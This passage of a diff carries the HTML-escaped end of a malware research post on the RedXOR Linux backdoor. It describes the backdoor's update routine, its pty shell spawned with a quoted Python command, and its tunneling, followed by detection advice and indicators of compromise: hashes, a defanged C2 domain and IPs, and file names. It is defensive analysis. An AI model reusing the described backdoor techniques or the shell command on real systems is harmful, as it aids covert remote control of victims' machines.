-command code 8 to the malware. When the malware receives this code the
-following actions are taken:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;The malware opens the mutex file for writing.&lt;/li&gt;
-&lt;li&gt;It sends a request with the command code 8 and an empty request body to the
-C2 server.&lt;/li&gt;
-&lt;li&gt;The response body from the server is written to the mutex file. The response
-body is not encrypted.&lt;/li&gt;
-&lt;li&gt;The lock is released on the mutex file.&lt;/li&gt;
-&lt;li&gt;The malware executes &amp;ldquo;chmod&amp;rdquo; to set the execution flag on the file via the
-libc system function.&lt;/li&gt;
-&lt;li&gt;The malware sleeps and tries to obtain the lock on the file again when it
-wakes up. If it fails, it assumes the update was successful, closes the
-connection to the C2 server and exits.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3&gt;Shell Functionality&lt;span class="hx:absolute hx:-mt-20" id="shell-functionality"&gt;&lt;/span&gt;
-&lt;a href="#shell-functionality" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The malware has the ability to provide its operator with a &lt;code&gt;tty&lt;/code&gt; shell. If a
-shell is requested via the command code 3000, the malware creates a new thread
-executing &lt;code&gt;/bin/sh&lt;/code&gt;. In the new spawned shell, the malware executes
-&lt;code&gt;python -c &amp;quot;import pty;pty.spawn('/bin/sh')&amp;quot;&lt;/code&gt; to get a pseudo-terminal (pty)
-interface. Any shell commands sent to the malware with the command code of 3058
-are executed in the pty and the response is returned to the operator.&lt;/p&gt;
-&lt;h3&gt;Network Tunneling&lt;span class="hx:absolute hx:-mt-20" id="network-tunneling"&gt;&lt;/span&gt;
-&lt;a href="#network-tunneling" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Network tunneling is enabled by sending the command code 4001 to the malware.
-As part of the request, a &amp;ldquo;configuration&amp;rdquo; is sent as part of the response body.
-The configuration consists of three items separated by a &amp;ldquo;#&amp;rdquo; character. The
-items are: a port to bind to, the IP to connect to, and a port to connect to.
-The malware uses a modified version of the open-source project Rinetd for the
-tunneling logic. Rinetd is designed to use a configuration file stored on the
-machine. To get around this, the malware author has modified the function that
-parses the configuration in order to directly take the required values normally
-found in the configuration file.&lt;/p&gt;
-&lt;h2&gt;Detection &amp;amp; Response&lt;span class="hx:absolute hx:-mt-20" id="detection--response"&gt;&lt;/span&gt;
-&lt;a href="#detection--response" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;Detect if a Machine in Your Network Has Been Compromised&lt;span class="hx:absolute hx:-mt-20" id="detect-if-a-machine-in-your-network-has-been-compromised"&gt;&lt;/span&gt;
-&lt;a href="#detect-if-a-machine-in-your-network-has-been-compromised" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Use a Cloud Workload Protection Platform like
-&lt;a href="https://intezer.com/intezer-protect"target="_blank" rel="noopener"&gt;Intezer Protect&lt;/a&gt; to gain full runtime
-visibility over the code in your Linux-based systems and get alerted on any
-malicious or unauthorized code or commands.
-&lt;a href="https://protect.intezer.com/signup"target="_blank" rel="noopener"&gt;Try our free community edition&lt;/a&gt; Figure 13
-emphasizes an Intezer Protect alert on a compromised machine. The alert
-provides additional context about the malicious code including threat
-classification (RedXOR), binary’s path on the disk, process tree, command, and
-hash.&lt;/p&gt;
-&lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2021/03/new-linux-backdoor-redxor-likely-operated-by-chinese-nation-state-actor/images/fig13.png" title="Figure 13: Intezer Protect alerts on RedXOR" alt="" loading="lazy" /&gt;
-&lt;figcaption&gt;Figure 13: Intezer Protect alerts on RedXOR&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;We also recommend using the IOCs section below to ensure that the RedXOR
-process and the files it creates do not exist on your system.&lt;/p&gt;
-&lt;p&gt;Intezer Protect defends all types of compute resources—including VMs,
-containers and Kubernetes—against the latest Linux threats in runtime.
-&lt;a href="https://protect.intezer.com/signup"target="_blank" rel="noopener"&gt;Try our free community edition&lt;/a&gt;&lt;/p&gt;
-&lt;h3&gt;Response&lt;span class="hx:absolute hx:-mt-20" id="response"&gt;&lt;/span&gt;
-&lt;a href="#response" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;If you are a victim of this operation, take the following steps:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;Kill the process and delete all files related to the malware.&lt;/li&gt;
-&lt;li&gt;Make sure your machine is clean and running only trusted code using a Cloud
-Workload Protection Platform like Intezer Protect.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2&gt;Wrap Up&lt;span class="hx:absolute hx:-mt-20" id="wrap-up"&gt;&lt;/span&gt;
-&lt;a href="#wrap-up" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Linux systems are under constant attack given that Linux runs on most of the
-public cloud workload. A
-&lt;a href="https://secure2.sophos.com/en-us/content/state-of-cloud-security.aspx"target="_blank" rel="noopener"&gt;survey conducted by Sophos&lt;/a&gt;
-found that 70% of organizations using the public cloud to host data or
-workloads experienced a security incident in the past year. Along with botnets
-and cryptominers, the Linux threat landscape is also home to sophisticated
-threats like RedXOR developed by
-&lt;a href="https://intezer.com/blog/malware-analysis/looking-back-on-the-last-decade-of-linux-apt-attacks/"target="_blank" rel="noopener"&gt;nation-state actors&lt;/a&gt;.
-RedXOR samples are indexed in Intezer Analyze so that you can detect any
-suspicious file that shares code with this malware.&lt;/p&gt;
-&lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2021/03/new-linux-backdoor-redxor-likely-operated-by-chinese-nation-state-actor/images/fig14.png" title="Figure 14: RedXOR sample in Intezer Analyze" alt="" loading="lazy" /&gt;
-&lt;figcaption&gt;Figure 14: RedXOR sample in Intezer Analyze&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;/p&gt;
-&lt;h2&gt;IoCs&lt;span class="hx:absolute hx:-mt-20" id="iocs"&gt;&lt;/span&gt;
-&lt;a href="#iocs" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;Files&lt;span class="hx:absolute hx:-mt-20" id="files"&gt;&lt;/span&gt;
-&lt;a href="#files" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
-&lt;div&gt;&lt;pre&gt;&lt;code&gt;0a76c55fa88d4c134012a5136c09fb938b4be88a382f88bf2804043253b0559f
-0423258b94e8a9af58ad63ea493818618de2d8c60cf75ec7980edcaa34dcc919&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
-&lt;button
-class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
-title="Copy code"
-aria-label="Copy code"
-data-copied-label="Copied!"
-&gt;
-&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
-&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
-&lt;/button&gt;
-&lt;/div&gt;
-&lt;/div&gt;
-&lt;h3&gt;Network&lt;span class="hx:absolute hx:-mt-20" id="network"&gt;&lt;/span&gt;
-&lt;a href="#network" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
-&lt;div&gt;&lt;pre&gt;&lt;code&gt;update[.]cloudjscdn[.]com
-158[.]247[.]208[.]230
-34[.]92[.]228[].216&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
-&lt;button
-class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
-title="Copy code"
-aria-label="Copy code"
-data-copied-label="Copied!"
-&gt;
-&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
-&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
-&lt;/button&gt;
-&lt;/div&gt;
-&lt;/div&gt;
-&lt;h3&gt;Process name&lt;span class="hx:absolute hx:-mt-20" id="process-name"&gt;&lt;/span&gt;
-&lt;a href="#process-name" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
-&lt;div&gt;&lt;pre&gt;&lt;code&gt;po1kitd-update-k&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
-&lt;button
-class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
-title="Copy code"
-aria-label="Copy code"
-data-copied-label="Copied!"
-&gt;
-&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
-&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
-&lt;/button&gt;
-&lt;/div&gt;
-&lt;/div&gt;
-&lt;h3&gt;File and directories created on disk&lt;span class="hx:absolute hx:-mt-20" id="file-and-directories-created-on-disk"&gt;&lt;/span&gt;
-&lt;a href="#file-and-directories-created-on-disk" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
-&lt;div&gt;&lt;pre&gt;&lt;code&gt;.po1kitd-update-k
-.po1kitd.thumb
-.po1kitd-2a4D53
-.po1kitd-k3i86dfv
-.po1kitd-nrkSh7d6
-.po1kitd-2sAq14
-.2sAq14
-.2a4D53
-po1kitd.ko
-po1kitd-update.desktop
-S99po1kitd-update.sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
 &lt;button
 class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
 title="Copy code"
